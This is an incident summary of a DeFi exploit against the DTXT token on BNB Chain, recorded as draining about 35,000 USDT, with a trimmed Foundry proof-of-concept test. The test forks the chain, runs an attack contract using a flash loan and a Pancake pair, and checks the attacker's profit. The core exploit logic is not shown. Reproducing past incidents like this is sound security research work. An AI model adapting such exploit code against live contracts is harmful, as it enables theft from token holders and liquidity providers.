# [?] DTXT - Liquidity Misclassification Fee Bypass

## Summary
Severity: Unknown
Chain: BNB Chain
Component: DTXT
Published: 2026-06-05
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/DTXT_exp.sol
Type: defi-exploit-poc

## Details
Lost: 35,041.11 USDT

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 102_432_239;
        vm.createSelectFork("bsc", forkBlock);
        fundingToken = USDT_TOKEN;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(HISTORICAL_DTXT_HELPER, "Historical DTXT seed helper");
        vm.label(MOOLAH_FLASH_LOAN, "Moolah flash loan proxy");
        vm.label(DTXT_TOKEN, "DTXT token");
        vm.label(DTXT_USDT_PAIR, "DTXT/USDT Pancake pair");
        vm.label(PANCAKE_ROUTER, "Pancake router");
        vm.label(USDT_TOKEN, "USDT");
    }

    function testExploit() public balanceLog2(ATTACKER) {
        DTXTSeedHelper helper = new DTXTSeedHelper();
        uint256 seedDtxt = IERC20(DTXT_TOKEN).balanceOf(HISTORICAL_DTXT_HELPER);
        deal(DTXT_TOKEN, address(helper), seedDtxt);
        vm.label(address(helper), "Local DTXT seed helper");

        DTXTExploit exploit = new DTXTExploit(address(helper), ATTACKER);
        vm.label(address(exploit), "Local attack contract");

        uint256 attackerBefore = IERC20(USDT_TOKEN).balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        exploit.execute();

        uint256 profit = IERC20(USDT_TOKEN).balanceOf(ATTACKER) - attackerBefore;
        logTokenBalance(USDT_TOKEN, ATTACKER, "Attacker Final");
        assertGt(profit, 35_000 ether, "USDT profit");
    }
}

contract DTXTSeedHelper {
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/DTXT_exp.sol_
